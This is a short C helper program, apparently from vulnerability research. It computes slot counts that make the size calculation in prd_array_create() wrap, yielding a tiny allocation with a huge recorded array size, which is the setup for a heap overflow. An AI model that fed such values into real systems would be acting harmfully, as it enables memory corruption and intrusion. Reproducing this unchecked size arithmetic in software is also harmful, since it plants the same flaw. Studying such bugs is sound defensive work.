// Compute slot values that cause integer overflow in prd_array_create()
// sizeof(struct pluginsd_rrddim) = 3 pointers = 24 bytes on 64-bit
// sizeof(PRD_ARRAY) = int32_t refcount (4) + pad (4) + size_t size (8) = 16
#include <stdio.h>
#include <stdint.h>
#include <stddef.h>

struct pluginsd_rrddim { void *rda; void *rd; const char *id; };
typedef struct pluginsd_rrddim_array { int32_t refcount; size_t size; struct pluginsd_rrddim entries[]; } PRD_ARRAY;

int main(void) {
    size_t elt = sizeof(struct pluginsd_rrddim);
    size_t hdr = sizeof(PRD_ARRAY);
    printf("sizeof(struct pluginsd_rrddim) = %zu\n", elt);
    printf("sizeof(PRD_ARRAY) = %zu\n", hdr);

    // We want hdr + slot*elt to wrap to a small number.
    // slot*elt mod 2^64 small -> slot ~ k * 2^64/elt
    // 2^64 / 24:
    unsigned __int128 two64 = (unsigned __int128)1 << 64;
    unsigned long long base = (unsigned long long)(two64 / elt); // floor(2^64/24)
    printf("floor(2^64/24) = 0x%llx (%llu)\n", base, base);

    // Try slot = base + delta and see allocation size
    for (unsigned long long delta = 0; delta <= 4; delta++) {
        unsigned long long slot = base + delta;
        size_t alloc = (size_t)(hdr + slot * elt); // mimic the C expression (wraps mod 2^64)
        printf("slot=0x%llx (%llu): alloc_size = %zu bytes ; arr->size=%llu\n",
               slot, slot, alloc, slot);
    }

    // Pick a slot that yields a small positive allocation but huge arr->size:
    // We want slot*24 mod 2^64 == X where hdr+X is a small malloc.
    // delta such that slot*24 = 24*base + 24*delta. 24*base = 2^64 - r where r = 2^64 mod 24
    unsigned long long r = (unsigned long long)(two64 % elt);
    printf("2^64 mod 24 = %llu\n", r);
    // 24*base = 2^64 - r  => mod 2^64 = (2^64 - r) mod 2^64 = -r = 2^64 - r (large). 
    // 24*(base+delta) mod 2^64 = (2^64 - r + 24*delta) mod 2^64 = 24*delta - r (for small delta, if 24*delta>=r)
    for (unsigned long long delta = 0; delta <= 4; delta++) {
        unsigned long long prod_mod = (unsigned long long)((unsigned __int128)elt * (base+delta) % two64);
        printf("delta=%llu -> slot*24 mod 2^64 = %llu, +hdr = %llu\n", delta, prod_mod, prod_mod+hdr);
    }
    return 0;
}
